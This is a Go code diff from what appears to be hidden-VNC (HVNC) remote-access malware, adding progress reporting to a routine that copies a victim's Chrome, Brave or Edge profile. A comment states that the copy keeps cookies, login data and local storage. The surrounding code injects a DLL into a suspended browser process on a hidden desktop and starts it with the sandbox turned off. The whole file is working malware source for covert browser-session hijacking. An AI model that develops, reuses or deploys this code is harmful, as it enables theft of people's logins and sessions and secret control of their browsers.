@@ -30,6 +30,8 @@ var (
 
 var advapi32 = syscall.NewLazyDLL("advapi32.dll")
 
+type CloneProgressFunc func(percent int, copiedBytes, totalBytes int64, status string)
+
 const (
 	PROCESS_CREATE_THREAD     = 0x0002
 	PROCESS_QUERY_INFORMATION = 0x0400
@@ -118,7 +120,7 @@ func StartHVNCProcessInjected(filePath string, dllBytes []byte, searchPath, repl
 // If clone is true, it clones the real profile so file I/O is redirected to the clone.
 // If clone is false, it starts the browser with injection but no path redirection.
 // browser should be one of: "chrome", "brave", "edge".
-func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, clone bool, cloneLite bool) error {
+func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, clone bool, cloneLite bool, onProgress CloneProgressFunc) error {
 	info, ok := browserInfoMap[strings.ToLower(browser)]
 	if !ok {
 		return fmt.Errorf("unknown browser %q", browser)
@@ -142,7 +144,7 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 	}
 	log.Printf("hvnc %s: real user data at %s", info.name, realUserData)
 
-	cloneDir, err := cloneBrowserProfile(info.name, realUserData, cloneLite)
+	cloneDir, err := cloneBrowserProfile(info.name, realUserData, cloneLite, onProgress)
 	if err != nil {
 		return fmt.Errorf("profile clone failed: %v", err)
 	}
@@ -153,7 +155,7 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 
 // StartHVNCChromeInjected is kept for backward compatibility.
 func StartHVNCChromeInjected(chromePath string, dllBytes []byte) error {
-	return StartHVNCBrowserInjected("chrome", chromePath, dllBytes, true, false)
+	return StartHVNCBrowserInjected("chrome", chromePath, dllBytes, true, false, nil)
 }
 
 type browserInfo struct {
@@ -225,7 +227,7 @@ func getBrowserUserDataDir(info browserInfo) string {
 // cloneBrowserProfile clones the browser user data directory, skipping only
 // large cache directories that aren't needed for a functional session.
 // This preserves extensions, cookies, login data, local storage, etc.
-func cloneBrowserProfile(browserName string, srcUserData string, lite bool) (string, error) {
+func cloneBrowserProfile(browserName string, srcUserData string, lite bool, onProgress CloneProgressFunc) (string, error) {
 	prefix := "hvnc_" + strings.ToLower(browserName) + "_"
 	// Remove any previous cloned profile directories so we always use fresh data
 	tmpDir := os.TempDir()
@@ -290,6 +292,32 @@ func cloneBrowserProfile(browserName string, srcUserData string, lite bool) (str
 		return "", fmt.Errorf("read user data dir: %v", err)
 	}
 
+	// Calculate total size for progress reporting
+	var totalBytes int64
+	if onProgress != nil {
+		onProgress(0, 0, 0, "scanning")
+		totalBytes = calcCloneSize(srcUserData, skipDirs)
+		onProgress(0, 0, totalBytes, "cloning")
+	}
+
+	var copiedBytes int64
+	lastPercent := -1
+
+	reportProgress := func(n int64) {
+		if onProgress == nil || totalBytes <= 0 {
+			return
+		}
+		copiedBytes += n
+		pct := int(copiedBytes * 100 / totalBytes)
+		if pct > 100 {
+			pct = 100
+		}
+		if pct != lastPercent {
+			lastPercent = pct
+			onProgress(pct, copiedBytes, totalBytes, "cloning")
+		}
+	}
+
 	for _, entry := range entries {
 		name := entry.Name()
 		src := filepath.Join(srcUserData, name)
@@ -299,28 +327,98 @@ func cloneBrowserProfile(browserName string, srcUserData string, lite bool) (str
 			// For profile directories (Default, Profile N), clone contents but skip caches inside
 			isProfile := strings.EqualFold(name, "Default") || strings.HasPrefix(name, "Profile ")
 			if isProfile {
-				if err := cloneProfileDir(browserName, src, dst, skipDirs); err != nil {
+				if err := cloneProfileDirProgress(browserName, src, dst, skipDirs, reportProgress); err != nil {
 					log.Printf("hvnc %s: warning: could not clone profile %s: %v", browserName, name, err)
 				}
 			} else if !skipDirs[strings.ToLower(name)] {
 				// Top-level non-profile directories (e.g. "Crashpad" skip, but keep others)
-				if err := copyDir(src, dst); err != nil {
+				if err := copyDirProgress(src, dst, reportProgress); err != nil {
 					log.Printf("hvnc %s: warning: could not copy dir %s: %v", browserName, name, err)
 				}
 			}
 		} else {
 			// Top-level files (Local State, etc.)
-			if err := copyFile(src, dst); err != nil {
+			n, err := copyFileCount(src, dst)
+			if err != nil {
 				log.Printf("hvnc %s: warning: could not copy %s: %v", browserName, name, err)
+			} else {
+				reportProgress(n)
 			}
 		}
+	}
+
+	if onProgress != nil {
+		onProgress(100, totalBytes, totalBytes, "done")
 	}
 
 	return cloneBase, nil
 }
 
-// cloneProfileDir copies a profile directory (e.g. Default/) skipping cache subdirs.
-func cloneProfileDir(browserName, src, dst string, skipDirs map[string]bool) error {
+// calcCloneSize walks the source user data directory and returns the total
+// byte count of files that would be copied (respecting skipDirs).
+func calcCloneSize(srcUserData string, skipDirs map[string]bool) int64 {
+	var total int64
+	entries, err := os.ReadDir(srcUserData)
+	if err != nil {
+		return 0
+	}
+	for _, entry := range entries {
+		name := entry.Name()
+		p := filepath.Join(srcUserData, name)
+		if entry.IsDir() {
+			isProfile := strings.EqualFold(name, "Default") || strings.HasPrefix(name, "Profile ")
+			if isProfile {
+				total += calcProfileSize(p, skipDirs)
+			} else if !skipDirs[strings.ToLower(name)] {
+				total += calcDirSize(p)
+			}
+		} else {
+			if info, err := entry.Info(); err == nil {
+				total += info.Size()
+			}
+		}
+	}
+	return total
+}
+
+func calcProfileSize(dir string, skipDirs map[string]bool) int64 {
+	var total int64
+	entries, err := os.ReadDir(dir)
+	if err != nil {
+		return 0
+	}
+	for _, entry := range entries {
+		name := entry.Name()
+		p := filepath.Join(dir, name)
+		if entry.IsDir() {
+			if !skipDirs[strings.ToLower(name)] {
+				total += calcDirSize(p)
+			}
+		} else {
+			if info, err := entry.Info(); err == nil {
+				total += info.Size()
+			}
+		}
+	}
+	return total
+}
+
+func calcDirSize(dir string) int64 {
+	var total int64
+	filepath.Walk(dir, func(_ string, info os.FileInfo, err error) error {
+		if err != nil {
+			return nil
+		}
+		if !info.IsDir() {
+			total += info.Size()
+		}
+		return nil
+	})
+	return total
+}
+
+// cloneProfileDirProgress copies a profile directory with progress reporting.
+func cloneProfileDirProgress(browserName, src, dst string, skipDirs map[string]bool, report func(int64)) error {
 	if err := os.MkdirAll(dst, 0700); err != nil {
 		return err
 	}
@@ -337,39 +435,42 @@ func cloneProfileDir(browserName, src, dst string, skipDirs map[string]bool) err
 			if skipDirs[strings.ToLower(name)] {
 				continue
 			}
-			if err := copyDir(s, d); err != nil {
+			if err := copyDirProgress(s, d, report); err != nil {
 				log.Printf("hvnc %s: warning: could not copy %s: %v", browserName, name, err)
 			}
 		} else {
-			if err := copyFile(s, d); err != nil {
+			n, err := copyFileCount(s, d)
+			if err != nil {
 				log.Printf("hvnc %s: warning: could not copy %s: %v", browserName, name, err)
+			} else {
+				report(n)
 			}
 		}
 	}
 	return nil
 }
 
-func copyFile(src, dst string) error {
+func copyFileCount(src, dst string) (int64, error) {
 	in, err := os.Open(src)
 	if err != nil {
-		return err
+		return 0, err
 	}
 	defer in.Close()
 
 	if err := os.MkdirAll(filepath.Dir(dst), 0700); err != nil {
-		return err
+		return 0, err
 	}
 	out, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0600)
 	if err != nil {
-		return err
+		return 0, err
 	}
 	defer out.Close()
 
-	_, err = io.Copy(out, in)
-	return err
+	n, err := io.Copy(out, in)
+	return n, err
 }
 
-func copyDir(src, dst string) error {
+func copyDirProgress(src, dst string, report func(int64)) error {
 	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
 		if err != nil {
 			return nil // skip errors
@@ -379,7 +480,11 @@ func copyDir(src, dst string) error {
 		if info.IsDir() {
 			return os.MkdirAll(target, 0700)
 		}
-		return copyFile(path, target)
+		n, err := copyFileCount(path, target)
+		if err == nil {
+			report(n)
+		}
+		return err
 	})
 }
 
@@ -435,9 +540,9 @@ func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath string) (
 	}
 	args := " --window-position=0,0"
 	browserExes := map[string]bool{
-		"chrome.exe":  true,
-		"brave.exe":   true,
-		"msedge.exe":  true,
+		"chrome.exe": true,
+		"brave.exe":  true,
+		"msedge.exe": true,
 	}
 	if browserExes[strings.ToLower(filepath.Base(filePath))] {
 		args += " --no-sandbox --allow-no-sandbox-job --disable-gpu"
